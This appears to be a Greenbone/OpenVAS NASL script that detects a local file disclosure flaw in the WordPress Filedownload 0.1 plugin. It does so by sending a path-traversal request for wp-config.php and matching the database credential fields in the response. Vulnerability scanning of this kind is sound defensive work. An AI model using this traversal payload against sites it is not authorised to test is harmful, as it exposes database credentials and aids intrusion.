CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103258" );
	script_version( "2019-12-05T15:10:00+0000" );
	script_tag( name: "last_modification", value: "2019-12-05 15:10:00 +0000 (Thu, 05 Dec 2019)" );
	script_tag( name: "creation_date", value: "2011-09-19 14:00:59 +0200 (Mon, 19 Sep 2011)" );
	script_bugtraq_id( 49669 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "WordPress Filedownload Local File Disclosure Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/49669" );
	script_xref( name: "URL", value: "http://plugins.svn.wordpress.org/filedownload/trunk/filedownload.php" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "This script is Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_tag( name: "summary", value: "The Filedownload plug-in for WordPress is prone to a local file-
disclosure vulnerability because it fails to adequately validate user-
supplied input.

Exploiting this vulnerability could allow an attacker to obtain
potentially sensitive information from local files on computers
running the vulnerable application. This may aid in further attacks.

Filedownload 0.1 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = NASLString( dir, "/wp-content/plugins/filedownload/download.php/?path=../../../wp-config.php " );
if(http_vuln_check( port: port, url: url, pattern: "DB_NAME", extra_check: make_list( "DB_USER",
	 "DB_PASSWORD",
	 "DB_HOST" ) )){
	security_message( port: port );
	exit( 0 );
}
exit( 0 );

